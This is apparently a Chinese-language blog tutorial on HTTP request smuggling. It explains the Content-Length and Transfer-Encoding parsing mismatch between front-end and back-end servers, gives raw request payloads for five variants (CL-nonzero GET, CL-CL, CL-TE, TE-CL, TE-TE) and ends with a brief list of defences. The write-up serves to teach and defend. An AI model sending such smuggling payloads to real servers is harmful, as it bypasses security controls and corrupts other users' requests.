---
layout:     post
title:      HTTP请求走私
date:       2020-05-19
author:     lceCr4m
header-img: img/3.jpg
catalog: true
tags:
    - HTTP请求走私
---
> 本文是关于HTTP请求走私的相关内容。

# 0x00 介绍
HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。是一种协议层攻击。
# 0x01 原理
HTTP规范提供了两种不同的方法来指定请求的结束位置，即Content-Length和Transfer-Encoding标头。当使用多个服务器时，对客户端传入的数据理解不一致时，就会出现有些服务器认为Content-Length的长度有效，有些以Transfer-Encoding有效。而一般情况下，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这样超出的长度就会拼接到下一次请求进行请求，从而导致HTTP请求走私漏洞。

前提：HTTP 1.1的协议特性——Keep-Alive&Pipeline。  
在HTTP1.0之前的协议设计中，客户端每进行一次HTTP请求，需要同服务器建立一个TCP链接。在1.1中添加了两个特性：

Keep-Alive：在HTTP请求中增加一个特殊的请求头Connection: Keep-Alive，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接。这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。这个特性在HTTP1.1中默认开启的。  
Pipeline(http管线化)：http管线化是一项实现了多个http请求但不需要等待响应就能够写进同一个socket的技术，仅有http1.1规范支持http管线化。在这里，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。
# 0x02 利用
五种方式
## Ⅰ CL不为0的GET请求

```
GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 44\r\n

GET /secret HTTP/1.1\r\n
Host: example.com\r\n
\r\n
```
前端服务器处理了 Content-Length ，而后端服务器没有处理 Content-Length ，基于pipeline机制认为这是两个独立的请求，就造成了漏洞的发生。
## Ⅱ CL-CL

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a
```
这个例子中a就会被带入下一个请求。比如：有一个正常用户发起了请求，因为代理服务器与源站服务器之间一般会重用TCP连接，所以正常用户的请求就拼接到了字母a的后面。
## Ⅲ CL-TE

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Connection: keep-alive\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
a
```
这个例子中a同样会被带入下一个请求，变为 aGET / HTTP/1.1\r\n 。
## Ⅳ TE-CL

```
POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
12\r\n
aPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
```

## Ⅴ TE-TE
TE-TE指前后端服务器都处理 Transfer-Encoding 请求头，但是在容错性上表现不同，例如有的服务器可能会处理 Transfer-encoding。
```
POST / HTTP/1.1\r\n
Host: example.com\r\n
...
Content-length: 4\r\n
Transfer-Encoding: chunked\r\n
Transfer-encoding: cow\r\n
\r\n
5c\r\n
aPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n
\r\n
```

# 0x03 防御
1. 禁用后端连接重用
1. 确保连接中的所有服务器具有相同的配置
1. 拒绝有二义性的请求
